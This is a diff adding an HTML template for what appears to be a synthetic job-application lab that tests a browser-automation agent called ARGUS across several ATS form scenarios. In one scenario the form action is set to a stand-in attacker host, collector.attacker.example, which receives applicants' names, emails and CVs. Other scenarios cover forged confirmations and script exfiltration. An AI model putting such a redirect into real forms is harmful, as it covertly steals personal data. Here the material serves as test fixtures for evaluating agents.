@@ -1,0 +1,114 @@
+{% set form_action = 'https://collector.attacker.example/collect' if scenario == 'exfiltration' else '/lab/ats/' ~ scenario ~ '/submit' %}
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>{{ role }} · {{ employer }}</title>
+  <link rel="stylesheet" href="/static/css/argus.css">
+</head>
+<body class="ats-body">
+<main class="ats-shell" data-ats="{{ adapter_type }}" data-employer="{{ marker_employer }}" data-role="{{ role }}" data-argus-form-identity="{{ scenario }}">
+  <header class="ats-header">
+    <div class="ats-logo" aria-hidden="true">ATC</div>
+    <div><span>ARGUS TEST CAPITAL</span><h1>{{ role }}</h1><p>London · 2027 Summer Internship</p></div>
+    <span class="lab-badge">LAB / {{ scenario|upper }}</span>
+  </header>
+  <section class="ats-description">
+    <h2>Build judgement under uncertainty.</h2>
+    <p>This is a controlled application form used exclusively to verify ARGUS browser automation. No information leaves this machine.</p>
+  </section>
+
+  {% if journey_entry %}
+  <section class="ats-entry" data-journey="popup-entry" data-popup-url="{{ popup_url }}" data-scenario="{{ scenario }}">
+    <p>This synthetic posting opens its verified application in a popup.</p>
+    <button type="button" data-automation-id="applyButton" id="popup-apply">Apply</button>
+  </section>
+  <script src="/lab/ats/{{ scenario }}/journey.js" defer></script>
+  {% elif popup_mode %}
+  <section class="ats-entry" data-journey="popup-shell">
+    <p>Application window</p>
+    <iframe title="Application form" id="application-frame" src={{ frame_url|tojson }}></iframe>
+  </section>
+  {% elif frame_mode %}
+  <form id="{{ 'grnhse_app' if adapter_type == 'greenhouse' else 'lever-application' }}" class="ats-form {{ adapter_type }}-form" action="{{ form_action }}" method="post" enctype="multipart/form-data">
+    <div class="ats-grid">
+      <label for="embedded-first">First name<input id="embedded-first" name="first_name" required></label>
+      <label for="embedded-last">Last name<input id="embedded-last" name="last_name" required></label>
+    </div>
+    <label for="embedded-email">Email address<input id="embedded-email" name="email" type="email" required></label>
+    <label for="embedded-uni">University / institution<input id="embedded-uni" name="university" required></label>
+    <label for="embedded-grad">Expected graduation year<select id="embedded-grad" name="graduation_year" required><option value="">Select</option><option>2027</option><option>2028</option><option>2029</option><option>2030</option></select></label>
+    <label for="embedded-cv">Upload CV<input id="embedded-cv" name="cv" type="file" accept=".pdf,.doc,.docx" required></label>
+    <button type="submit" data-automation-id="submitButton" class="ats-submit">Submit application</button>
+  </form>
+  {% elif scenario in ['smartrecruiters-journey', 'workable-journey'] %}
+  <div class="ats-distractions"><button type="button" data-lab-distraction>Subscribe to job alerts</button><a href="/lab?search=jobs" data-lab-distraction>Search jobs</a></div>
+  <section id="{{ scenario }}-application-root" data-provider-journey data-provider="{{ adapter_type }}" data-ats="{{ adapter_type }}" data-employer="{{ employer }}" data-role="{{ role }}" data-requisition="{{ requisition }}" data-scenario="{{ scenario }}" data-form-action="{{ form_action }}"></section>
+  <script src="/lab/ats/{{ scenario }}/journey.js" defer></script>
+  {% elif scenario == 'workday-journey' %}
+  <section id="workday-journey-shell" data-form-action="{{ form_action }}" data-requisition="{{ requisition }}">
+    <div id="workday-landing"><button type="button" data-automation-id="adventureButton">Apply</button></div>
+  </section>
+  <script src="/lab/ats/{{ scenario }}/journey.js" defer></script>
+  {% elif scenario in ['greenhouse', 'duplicate-controls', 'ambiguous-submit', 'absent-submit'] %}
+  <form id="grnhse_app" class="ats-form greenhouse-form" action="{{ form_action }}" method="post" enctype="multipart/form-data"{% if scenario == 'forged' %} data-forged-confirmation="true"{% endif %}{% if scenario == 'script-exfiltration' %} data-script-exfiltration="true"{% endif %}>
+    <div class="ats-grid">
+      <label for="first">First name<input id="first" name="first_name" required></label>
+      <label for="last">Last name<input id="last" name="last_name" required></label>
+    </div>
+    <label for="email">Email address<input id="email" name="email" type="email" required></label>
+    <label for="uni">University / institution<input id="uni" name="university" required></label>
+    <label for="grad">Expected graduation year<select id="grad" name="graduation_year" required><option value="">Select</option><option>2027</option><option>2028</option><option>2029</option><option>2030</option></select></label>
+    <fieldset><legend>Will you require sponsorship?</legend><label class="ats-radio"><input type="radio" name="sponsor" value="yes" required>Yes</label><label class="ats-radio"><input type="radio" name="sponsor" value="no" required>No</label></fieldset>
+    <label for="cv">Upload CV<input id="cv" name="cv" type="file" accept=".pdf,.doc,.docx" required></label>
+    {% if scenario == 'duplicate-controls' %}<button id="disabled-submit" type="submit" disabled>Submit application</button><button id="hidden-submit" type="submit" hidden>Submit application</button>{% endif %}
+    {% if scenario != 'absent-submit' %}<button id="greenhouse-submit" type="submit" class="ats-submit">Submit application</button>{% else %}<button type="button" class="ats-submit">Save draft</button>{% endif %}
+    {% if scenario == 'ambiguous-submit' %}<button id="greenhouse-submit-secondary" type="submit" class="ats-submit">Submit application</button>{% endif %}
+  </form>
+  {% elif scenario == 'lever' %}
+  <form id="lever-application" class="ats-form posting-apply" action="{{ form_action }}" method="post" enctype="multipart/form-data">
+    <div class="application-question"><label for="lever-first">First name</label><input id="lever-first" name="first_name" required></div>
+    <div class="application-question"><label for="lever-last">Last name</label><input id="lever-last" name="last_name" required></div>
+    <div class="application-question"><label for="lever-email">Email address</label><input id="lever-email" name="email" type="email" required></div>
+    <div class="application-question"><label for="lever-uni">University / institution</label><input id="lever-uni" name="university" required></div>
+    <div class="application-question"><label for="lever-grad">Expected graduation year</label><select id="lever-grad" name="graduation_year" required><option value="">Select</option><option>2027</option><option>2028</option><option>2029</option><option>2030</option></select></div>
+    <fieldset><legend>Will you require sponsorship?</legend><label class="ats-radio"><input type="radio" name="sponsor" value="yes" required>Yes</label><label class="ats-radio"><input type="radio" name="sponsor" value="no" required>No</label></fieldset>
+    <div class="application-question"><label for="lever-cv">Upload CV</label><input id="lever-cv" name="cv" type="file" accept=".pdf,.doc,.docx" required></div>
+    <button id="lever-submit" type="submit" class="ats-submit">Submit application</button>
+  </form>
+  {% elif scenario == 'workday' %}
+  <form id="wd-application" class="ats-form workday-form" data-automation-id="wd-application" action="{{ form_action }}" method="post" enctype="multipart/form-data">
+    <div data-automation-id="legalNameSection" class="ats-grid">
+      <label id="wd-first-label" for="wd-first">First name</label><input id="wd-first" name="first_name" aria-labelledby="wd-first-label" required>
+      <label id="wd-last-label" for="wd-last">Last name</label><input id="wd-last" name="last_name" aria-labelledby="wd-last-label" required>
+    </div>
+    <label id="wd-email-label" for="wd-email">Email address</label><input id="wd-email" name="email" type="email" aria-labelledby="wd-email-label" required>
+    <label id="wd-uni-label" for="wd-uni">University / institution</label><input id="wd-uni" name="university" aria-labelledby="wd-uni-label" required>
+    <label id="wd-grad-label" for="wd-grad">Expected graduation year</label><select id="wd-grad" name="graduation_year" aria-labelledby="wd-grad-label" required><option value="">Select</option><option>2027</option><option>2028</option><option>2029</option><option>2030</option></select>
+    <fieldset><legend>Will you require sponsorship?</legend><label class="ats-radio"><input type="radio" name="sponsor" value="yes" required>Yes</label><label class="ats-radio"><input type="radio" name="sponsor" value="no" required>No</label></fieldset>
+    <label id="wd-cv-label" for="wd-cv">Upload CV</label><input id="wd-cv" name="cv" type="file" aria-labelledby="wd-cv-label" accept=".pdf,.doc,.docx" required>
+    <button data-automation-id="submitButton" id="workday-submit" type="submit" class="ats-submit">Submit application</button>
+  </form>
+  {% else %}
+  <form class="ats-form" action="{{ form_action }}" method="post" enctype="multipart/form-data"{% if scenario == 'forged' %} data-forged-confirmation="true"{% endif %}{% if scenario == 'script-exfiltration' %} data-script-exfiltration="true"{% endif %}>
+    <div class="ats-grid"><label for="first">First name<input id="first" name="first_name" required></label><label for="last">Last name<input id="last" name="last_name" required></label></div>
+    <label for="email">Email address<input id="email" name="email" type="email" required></label>
+    <label for="uni">University / institution<input id="uni" name="university" required></label>
+    <label for="grad">Expected graduation year<select id="grad" name="graduation_year" required><option value="">Select</option><option>2027</option><option>2028</option><option>2029</option><option>2030</option></select></label>
+    <fieldset><legend>Will you require sponsorship?</legend><label class="ats-radio"><input type="radio" name="sponsor" value="yes" required>Yes</label><label class="ats-radio"><input type="radio" name="sponsor" value="no" required>No</label></fieldset>
+    <label for="cv">Upload CV<input id="cv" name="cv" type="file" accept=".pdf,.doc,.docx" required></label>
+    {% if scenario == 'sensitive' %}<label for="ethnicity">What is your ethnic background?<select id="ethnicity" name="ethnicity" required><option value="">Prefer not to say</option><option>Asian</option><option>Black</option><option>Mixed</option><option>White</option><option>Other</option></select></label>{% endif %}
+    {% if scenario == 'essay' %}<label for="motivation">Why are you interested in private credit?<textarea id="motivation" name="motivation" required rows="7"></textarea></label>{% endif %}
+    {% if scenario == 'assessment' %}<div class="assessment-box"><h3>Online assessment required</h3><p>A numerical reasoning assessment is part of this application.</p><button type="button">Begin online assessment</button></div>{% endif %}
+    {% if scenario == 'unknown' %}<label for="unknown-proof">Name the internal allocation code for this programme<input id="unknown-proof" name="internal_allocation_code" required></label>{% endif %}
+    <button type="submit" class="ats-submit">Submit application</button>
+  </form>
+  {% endif %}
+
+  {% if scenario in ['forged', 'script-exfiltration'] %}<script src="/static/js/lab.js" defer></script>{% endif %}
+  {% if adapter_type == 'greenhouse' %}<script src="/static/js/greenhouse-file-readback.js" defer></script>{% endif %}
+  <footer class="ats-footer">Synthetic ATS · Built for deterministic verification</footer>
+</main>
+</body>
+</html>
